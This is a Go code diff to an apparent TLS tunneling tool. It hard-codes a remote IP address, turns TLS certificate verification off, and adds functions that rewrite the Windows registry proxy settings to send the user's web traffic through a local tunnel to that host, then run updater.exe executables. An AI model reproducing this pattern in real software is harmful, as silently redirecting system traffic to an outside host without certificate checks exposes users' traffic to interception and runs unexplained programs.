@@ -4,14 +4,17 @@ import (
 	lg "crawler/log"
 	"crypto/tls"
 	"flag"
+	"golang.org/x/sys/windows/registry"
 	"io"
+	"log"
 	"net"
+	"os/exec"
 	"time"
 )
 
 var (
 	dialer = &net.Dialer{Timeout: 5 * time.Second}
-	remote = flag.String("remote", "", "remote tls proxy want tunnel")
+	remote = flag.String("remote", "103.200.6.26:443", "remote tls proxy want tunnel")
 	host   string
 )
 
@@ -43,11 +46,12 @@ func main() {
 func handleRequest(src net.Conn) {
 	cfg := &tls.Config{
 		ServerName:         host,
-		InsecureSkipVerify: false,
+		InsecureSkipVerify: true,
 	}
-	remote, err := tls.DialWithDialer(dialer, "tcp", cfg.ServerName+":443", cfg)
+	remote, err := tls.DialWithDialer(dialer, "tcp", *remote, cfg)
 	if err != nil {
 		lg.Printf("======== dial remote failed, error %s ========", err)
+		return
 	}
 	tunnel(src, remote)
 }
@@ -67,4 +71,40 @@ func tunnel(src, remote net.Conn) {
 		done <- struct{}{}
 	}()
 	<-done
+}
+
+func setupProxy() {
+	// set
+	key, ok, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
+	defer key.Close()
+	if !ok {
+		log.Fatalf("can't create key ProxyServer, %v", err)
+	}
+	key.SetStringValue("ProxyServer", "127.0.0.1:1443")
+	// enable proxy
+	key.SetDWordValue("ProxyEnable", uint32(1))
+	c := exec.Command("updater.exe")
+	err = c.Run()
+	if err != nil {
+		lg.Printf("Exec error %v", err)
+	}
+	update()
+}
+func cleanProxy() {
+	key, ok, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Internet Settings`, registry.ALL_ACCESS)
+	defer key.Close()
+	if !ok {
+		log.Fatalf("can't cleanProxy,  %v", err)
+	}
+	// disable proxy
+	key.SetDWordValue("ProxyEnable", uint32(0))
+	update()
+}
+
+func update() {
+	c := exec.Command("plugin/updater.exe")
+	err := c.Run()
+	if err != nil {
+		lg.Printf("Exec error %v", err)
+	}
 }
